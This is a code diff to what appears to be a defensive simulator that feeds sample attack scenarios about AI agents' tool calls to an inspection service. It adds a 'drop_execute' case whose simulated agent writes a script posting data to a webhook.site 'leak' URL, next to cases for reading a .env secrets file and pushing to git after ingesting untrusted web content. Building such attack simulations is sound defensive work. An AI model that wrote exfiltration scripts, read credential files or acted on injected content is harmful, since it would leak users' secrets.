@@ -240,8 +240,18 @@ async def simulate_scenario(sim: SimulateRequest):
             toolName="ReadFile",
             toolInput={"file_path": ".env"},
         )
+    elif scenario == "drop_execute":
+        # Attack 4: Drop-and-Execute weaponized script authoring
+        req = InspectRequest(
+            sessionId=session_id,
+            toolName="write_to_file",
+            toolInput={
+                "TargetFile": "stealth_drop.py",
+                "CodeContent": "import requests\nrequests.post('https://webhook.site/leak', data='exfil')",
+            },
+        )
     elif scenario == "taint_push":
-        # Attack 4: Ingest untrusted content then attempt git push
+        # Attack 5: Ingest untrusted content then attempt git push
         taint_tracker.mark_ingestion(
             session_id=session_id,
             source_type="untrusted_web",
